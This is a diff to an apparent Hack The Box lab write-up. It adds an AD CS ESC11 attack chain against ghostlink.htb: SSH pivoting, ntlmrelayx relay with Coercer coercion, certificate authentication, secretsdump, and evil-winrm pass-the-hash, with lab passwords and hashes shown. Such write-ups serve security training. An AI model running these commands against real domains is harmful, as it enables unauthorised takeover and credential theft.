@@ -440,24 +440,66 @@ ip a
 </strong>ssh nvirelli@240.0.0.1 -p 2222
 </code></pre>
 
-**I found many things interesting i pivot to 172.16.20.0/24 but when i try to enumarate the AD like a dead end so with the DMZ IP it works i dont know why however now we have a domain user on AD**&#x20;
-
-```bash
-bloodhound-python -c all -u $user -p $pass -d $domain -ns $ip --zip
-# i dont have any intersting ACL also the shares nothing and every entry point 
-
-```
+**Then i setup another dynamic port forwarding on ssh to facliliate the pivot**
 
 {% code overflow="wrap" %}
 ```bash
-certipy-ad find -u '$user@$domain' -p $pass -dc-host $dc -ns 10.129.244.158 -dns-tcp -timeout 10 -vulnerable -stdout
+ssh -D 1080 -N -f nvirelli@240.0.0.1 -p 2222
 
- CA Name                             : ghostlink-GPZ-OP26-SECURE-CA
-   DNS Name                            : gpz-op26-secure.ghostlink.htb
+proxychains4 certipy-ad find -u 'nvirelli@ghostlink.htb' -p 'u47YUclrDiwWxBheaSzI' -dc-ip 10.129.44.149 -dns-tcp -timeout 10 -vulnerable -stdout
+
+
+CA Name                             : ghostlink-GPZ-OP26-SECURE-CA
+    DNS Name                            : gpz-op26-secure.ghostlink.htb
     Certificate Subject                 : CN=ghostlink-GPZ-OP26-SECURE-CA, DC=ghostlink, DC=htb
     Certificate Serial Number           : 3F4302F3D68A6AAE4B792DB93F31CCE5
     Certificate Validity Start          : 2026-03-03 16:52:14+00:00
     Certificate Validity End            : 2126-03-03 17:02:12+00:00
+    Web Enrollment
+      HTTP
+        Enabled                         : True
+      HTTPS
+        Enabled                         : False
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Disabled
+    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
+    Permissions
+      Owner                             : GHOSTLINK.HTB\Administrators
+      Access Rights
+        ManageCa                        : GHOSTLINK.HTB\Administrators
+                                          GHOSTLINK.HTB\Domain Admins
+                                          GHOSTLINK.HTB\Enterprise Admins
+        ManageCertificates              : GHOSTLINK.HTB\Administrators
+                                          GHOSTLINK.HTB\Domain Admins
+                                          GHOSTLINK.HTB\Enterprise Admins
+        Enroll                          : GHOSTLINK.HTB\Authenticated Users
+    [!] Vulnerabilities
+      ESC8                              : Web Enrollment is enabled over HTTP.
+      ESC11                             : Encryption is not enforced for ICPR (RPC) requests.
+Certificate Templates                   : [!] Could not find any certificate templates
+
 ```
 {% endcode %}
+
+**Let's exploit this directly, referring on my sheet you can found it on my repo on github i explained in details the ESC11**  [**https://github.com/greenboys244/gitbook**](https://github.com/greenboys244/gitbook)
+
+{% code overflow="wrap" %}
+```bash
+proxychains4 ntlmrelayx.py -t rpc://172.16.20.10 -rpc-mode ICPR -icpr-ca-name 'ghostlink-GPZ-OP26-SECURE-CA' --template DomainController -smb2support --smb-port 1234
+# [*] rpc://GHOSTLINK/DC01$@172.16.20.10 [1] -> Writing PKCS#12 certificate to ./DC01.pfx
+
+coercer coerce -t DC01.ghostlink.htb -u nvirelli -p 'u47YUclrDiwWxBheaSzI' -d ghostlink.htb -l 10.10.14.92 --smb-port 1234
+
+
+fake_dc $dc certipy-ad auth -pfx 'DC01.pfx' -dc-ip 10.129.44.149
+
+
+secretsdump.py -hashes :102091564a2484d9fae200f35a0eca94 GHOSTLINK/dc01\$@10.129.44.149 -dc-ip 10.129.44.149
+
+evil-winrm -i 10.129.44.149 -u Administrator -H 8190e067f478002ddd63eb209b016696
+```
+{% endcode %}
+
+
 
